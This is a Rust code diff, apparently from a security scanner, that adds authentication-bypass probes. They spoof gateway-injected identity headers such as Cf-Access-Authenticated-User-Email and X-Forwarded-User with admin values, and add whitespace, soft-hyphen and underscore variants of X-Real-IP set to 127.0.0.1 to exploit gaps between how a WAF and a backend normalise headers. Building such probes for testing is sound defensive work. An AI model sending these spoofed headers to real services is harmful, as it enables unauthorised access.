@@ -181,6 +181,72 @@ pub fn auth_bypass_probes(target_path: &str) -> Vec<AuthBypassProbe> {
         }
     }
 
+    // ── 2026 frontier: gateway-injected-identity family ──────────────
+    // Cloud API gateways (Cloudflare Access, AWS API Gateway, Azure
+    // Front Door, GCP IAP, Auth0 Authorization Code Flow) inject
+    // identity headers AFTER the gateway authenticates the caller.
+    // Some backends trust these unconditionally — if the WAF is
+    // upstream of the gateway (uncommon but happens in zero-trust
+    // chained-proxy setups) or if a misconfigured backend reads them
+    // from any caller, spoofing the identity bypasses auth.
+    for h in [
+        "Cf-Access-Authenticated-User-Email", // Cloudflare Access
+        "Cf-Access-Jwt-Assertion",
+        "X-Goog-Authenticated-User-Email",    // GCP IAP
+        "X-Goog-Iap-Jwt-Assertion",
+        "X-Amzn-Oidc-Identity",                // AWS ALB OIDC
+        "X-Amzn-Oidc-Data",
+        "X-Ms-Client-Principal-Name",          // Azure App Service Easy Auth
+        "X-Ms-Client-Principal-Id",
+        "X-Ms-Token-Aad-Id-Token",
+        "X-Authentik-Username",                // Authentik / open-source proxy
+        "X-Authentik-Groups",
+        "X-Auth-Request-User",                 // oauth2-proxy default
+        "X-Auth-Request-Email",
+        "X-Auth-Request-Groups",
+        "X-Forwarded-User",                    // Traefik forwardAuth default
+        "X-Forwarded-Email",
+        "X-Forwarded-Groups",
+        "X-Webauth-User",                      // Grafana
+    ] {
+        for v in [
+            "admin",
+            "admin@example.com",
+            "root",
+            "root@localhost",
+            "administrator@internal",
+        ] {
+            out.push(AuthBypassProbe {
+                header: h.to_string(),
+                value: v.to_string(),
+                label: "gateway-identity-spoof",
+                description: "Backend trusts gateway-injected identity header without verifying upstream signature",
+            });
+        }
+    }
+
+    // ── 2026 frontier: header-smuggling-via-LWS family ───────────────
+    // Single-char obfuscations of a known-trusted header name that
+    // some WAFs strip-normalise (case-insensitive byte compare) but
+    // backends preserve as a distinct header. If the backend has a
+    // case-insensitive lookup AND the WAF normalises tokens via
+    // strict case-insensitive ASCII matching only, this slips.
+    for variant in [
+        " X-Real-IP",       // leading space
+        "X-Real-IP\t",      // trailing tab
+        "X\u{00ad}Real-IP", // soft hyphen U+00AD inside (some parsers drop)
+        "X-Real_IP",        // underscore swap (nginx default DROPS this;
+                            // Apache passes it through — divergence
+                            // surfaces the misconfiguration).
+    ] {
+        out.push(AuthBypassProbe {
+            header: variant.to_string(),
+            value: "127.0.0.1".to_string(),
+            label: "header-smuggle-lws",
+            description: "Whitespace / case / underscore variant of a trusted header — exploits WAF↔backend normalisation gap",
+        });
+    }
+
     out
 }
 
@@ -280,8 +346,9 @@ mod tests {
         // Lock the count so a future edit doesn't silently drop a probe
         // family. URL-rewrite (6) + IP-trust (12 headers × 7 IPs = 84)
         // + Host-trust (4 × 4 = 16) + Method-override (4 × 6 = 24)
-        // + Scheme-trust (3 × 2 = 6) = 136.
+        // + Scheme-trust (3 × 2 = 6) + Gateway-identity (18 × 5 = 90)
+        // + Header-smuggle-LWS (4) = 230.
         let probes = auth_bypass_probes("/x");
-        assert_eq!(probes.len(), 136, "auth_bypass_probes count drift");
+        assert_eq!(probes.len(), 230, "auth_bypass_probes count drift");
     }
 }
